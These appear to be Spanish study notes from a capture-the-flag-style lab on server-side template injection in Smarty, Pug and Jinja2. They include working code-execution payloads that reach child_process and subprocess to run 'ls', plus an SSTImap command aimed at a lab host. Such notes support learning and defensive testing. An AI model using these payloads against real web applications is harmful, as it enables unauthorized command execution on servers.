# Server Side Template Injection

# Introducción

Server-Side template injecition, o SSTI, es una vulnerabilidad que ocurre cuando el usaurio inpute y injecta dentro de template de una aplicación. Esto puede recorrer un rango de fallos de seguridad, incluyendo codigo de ejecución, datos expuesto, escala de privielgios, denegación de servicio. Las vulnerabilidades SSTI suelen econtrarse en apliaciones web que usan templates engines y generar contenido dinamido y generar consecuencias

# Objetivos

- Etender las funciones básicas de las plantillas y porque se integran en las aplicaciones web
- Identificar vulnerabilidades con las apliaciones web con SSTI
- Ejecutar ataques con diferentes plantillas como Smarty (PHP), Jinja2(Python) y Jade (NodeJS)

# Plantillas

Una plantilla es como una maquina que ayuda a construir la web dinamicamente. Así funciona:

1. Plantilla
2. Inputs de usuario
3. Combinaciones
4. Output

Los motores de plantilla tienen varias funciones que aumentan a los desarrolladores procesos que pueden introducir fallos. Los mayores motores de plantilla tienen expresiones de como usar simple calculos o operadores logicos

En el contexto de un SSTI, el motor de plantilla esta habilitado para ejecuta codigo y hacer los ataques vulnerables. Si el usuario inputea y no esta propiamente sanitizado, el atacante puede generar código malicioso, con la plantilla el motor se ejecuta.

## Como funcionan

```
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")
print(output)
```

## Saber cual es

Jinja2/Twig

![image](https://github.com/user-attachments/assets/3d255028-555b-487d-8383-7be63dda363f)

![image](https://github.com/user-attachments/assets/37576782-8951-421c-a227-40d1ef5b5d3f)

Jade/Pug

![image](https://github.com/user-attachments/assets/ecca69f0-61be-42b2-a1cb-04f2e69a9d0b)

![image](https://github.com/user-attachments/assets/e5161653-b5af-4044-a85f-1ee6c965daea)

# PHP- Smarty

Smarty es una herramienta muy importante, es otro motor de plantilla en php

## Explotación

![image](https://github.com/user-attachments/assets/e8450429-0531-4f64-bb0a-b132927f0d75)

![image](https://github.com/user-attachments/assets/df691488-5846-42e0-af80-c16285f133f9)

Confirmado que funciona..

# NodeJS - Pug

Pug (anteriormente conocido como Jade) Es un motor de plantilla que usa Node.js renderizando HTML como condicionales, iteraciones y plantillas. Mientras Pug da bastantes buenas herramientas a los desarrolladores, esta disponible para ejectuar código JS directamente sin la necesidad de la plantilla.

Las vulnerabilidades normalmente entran poir lo anterior

## Explotacion

![image](https://github.com/user-attachments/assets/848b8ae1-62a4-4931-928d-639d263c64e4)

```
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
```

![image](https://github.com/user-attachments/assets/79407ef5-a49d-4a53-8b63-88d22c56a7c8)

```
{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```

# Python - Jinja2

## Explotación

![image](https://github.com/user-attachments/assets/822e9708-10d9-4c4a-8750-bacb5c1ad287)

```
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```

![image](https://github.com/user-attachments/assets/40db1b5b-e468-4de7-84c2-1dd24f4aaec7)

![image](https://github.com/user-attachments/assets/4ea81fd5-8eb0-4ef3-b6bb-c572c8e7cd55)

![image](https://github.com/user-attachments/assets/03b047d2-302d-4edb-8e54-5f5475f3969a)

```
subprocess.check_output([command, arg1, arg2])
```

```
subprocess.check_output(['ls', '-lah'])
```

![image](https://github.com/user-attachments/assets/d41f8497-0dc1-43f8-991b-e786b99bcf8e)

# Automatización

SSTImap es una herramienta para automatizar el proceso y testear vulnerabilidades

https://github.com/vladko312/SSTImap

```
pip install -r requeriments.txt
```

```
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

## Ejempl

```
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```











